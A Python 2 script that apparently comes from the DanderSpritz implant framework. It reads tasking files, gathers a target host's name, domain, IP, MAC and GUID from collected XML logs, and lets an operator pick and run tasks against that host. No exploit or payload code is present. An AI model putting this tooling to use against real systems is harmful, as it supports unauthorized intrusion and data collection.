
import dsz
import dsz.lp
import tasking
import ops
import glob
import os
import re
import shutil
import sys
import xml.dom.minidom
Verbose_Option = 'verbose'
Tasking_Option = 'tasking'
Auto_Option = 'auto'
Max_Option = 'max'
MaximumConcurrentTasks = 10

def main(argv):
    dsz.control.echo.Off()
    cmdParams = dsz.lp.cmdline.ParseCommandLine(argv, '_tasking.txt')
    if (len(cmdParams) == 0):
        return False
    if (Tasking_Option in cmdParams):
        taskingLocation = cmdParams[Tasking_Option][0]
    else:
        taskingLocation = os.path.join(ops.PREPS, ops.PROJECT, 'DSZ', 'TaskedCmds')
    if (Auto_Option in cmdParams):
        dsz.script.Env[tasking.AutomaticallyProceed] = True
    else:
        dsz.script.Env[tasking.AutomaticallyProceed] = False
    if (Max_Option in cmdParams):
        dsz.script.Env[tasking.tasking.MaximumTasks] = int(cmdParams[Max_Option][0])
    else:
        dsz.script.Env[tasking.tasking.MaximumTasks] = MaximumConcurrentTasks
    banner = '---------------------------------------------------------------------'
    dsz.ui.Echo(banner, dsz.GOOD)
    dsz.ui.Echo(('- %-65s -' % GetProjectVersion()), dsz.GOOD)
    dsz.ui.Echo(('- Looking for tasking in %-42s -' % taskingLocation), dsz.GOOD)
    dsz.ui.Echo(banner, dsz.GOOD)
    allTasking = list()
    for (dirname, dirnames, filenames) in os.walk(taskingLocation):
        for file in filenames:
            matched = re.match('(.*)_metadata.txt', file)
            if (not matched):
                continue
            tasks = ReadTasking(matched.group(1), dirname, file, filenames)
            if (tasks != None):
                allTasking.append(tasks)
    CurrentState = GetHostInformation()
    for potentialTasking in allTasking:
        potentialTasking.EvaluateThisTarget(CurrentState)
    allTasking = sorted(allTasking, key=(lambda tasking: tasking.Recommendation))
    while True:
        if dsz.script.CheckStop():
            return False
        (tasks, index) = dsz.menu.ExecuteSimpleMenu('Possible Taskings', allTasking)
        if (tasks == ''):
            break
        if tasks.DisplayMatchAndConsiderStart(CurrentState, dsz.script.Env[tasking.AutomaticallyProceed], True):
            tasks.DoTasking()
            allTasking.remove(tasks)
    return True

def ReadTasking(name, directory, metadata, taskingFiles):
    try:
        t = tasking.Tasking(name, ('%s/%s' % (directory, metadata)))
        for file in taskingFiles:
            if (not re.match('.*.txt', file)):
                continue
            task = tasking.GenerateTasking(file, directory)
            if (task == None):
                continue
            t.tasks.append(task)
    except Exception as e:
        raise 
        dsz.ui.Echo(('Unable to parse tasking:  %s' % e), dsz.ERROR)
        return None
    return t

def GetHostInformation():
    hostDir = dsz.script.Env['log_path']
    CurrentState = dict()
    CurrentState[tasking.HostName] = list()
    CurrentState[tasking.Domain] = list()
    CurrentState[tasking.IpAddress] = list()
    CurrentState[tasking.Mac] = list()
    CurrentState[tasking.PcId] = list()
    CurrentState[tasking.Guid] = list()
    for file in os.listdir(hostDir):
        if re.match('PcInfo_.*.xml', file):
            _ImproveStatePc(CurrentState, ('%s/%s' % (hostDir, file)))
            continue
        if re.match('hostinfo_.*.xml', file):
            _ImproveStateHost(CurrentState, ('%s/%s' % (hostDir, file)))
            continue
    return CurrentState

def _ImproveStateHost(CurrentState, file):
    try:
        doc = xml.dom.minidom.parse(file)
        for hostName in doc.getElementsByTagName('HostName'):
            CurrentState[tasking.HostName].append(GetContainedString(hostName))
        for domain in doc.getElementsByTagName('Domain'):
            CurrentState[tasking.Domain].append(GetContainedString(domain))
        for ip in doc.getElementsByTagName('Ip'):
            ipAddress = GetContainedString(ip)
            while ('%%' in ipAddress):
                ipAddress = ipAddress.replace('%%', '%')
            CurrentState[tasking.IpAddress].append(ipAddress)
        for mac in doc.getElementsByTagName('Mac'):
            CurrentState[tasking.Mac].append(GetContainedString(mac))
        for guid in doc.getElementsByTagName('Guid_cryptography'):
            CurrentState[tasking.Guid].append(GetContainedString(guid))
    except:
        pass

def _ImproveStatePc(CurrentState, file):
    try:
        doc = xml.dom.minidom.parse(file)
        for id in doc.getElementsByTagName('Id'):
            print id
            CurrentState[tasking.PcId].append(GetContainedString(id))
    except:
        raise 

def GetContainedString(xmlNode):
    s = ''
    try:
        for n in xmlNode.childNodes:
            if (n.nodeType == xml.dom.Node.TEXT_NODE):
                s = ('%s%s' % (s, n.data))
    except:
        raise 
    return s

def GetProjectVersion():
    try:
        resDir = dsz.lp.GetResourcesDirectory()
        xmlFile = ('%s/Tasking/Version.xml' % resDir)
        doc = xml.dom.minidom.parse(xmlFile)
        verNode = doc.getElementsByTagName('Version').item(0)
        verStr = ''
        for n in verNode.childNodes:
            if (n.nodeType == xml.dom.Node.TEXT_NODE):
                verStr = ('%s%s' % (verStr, n.data))
        return verStr
    except:
        return 'DszTasking 0.0.0.0'
if (__name__ == '__main__'):
    if (main(sys.argv) != True):
        sys.exit((-1))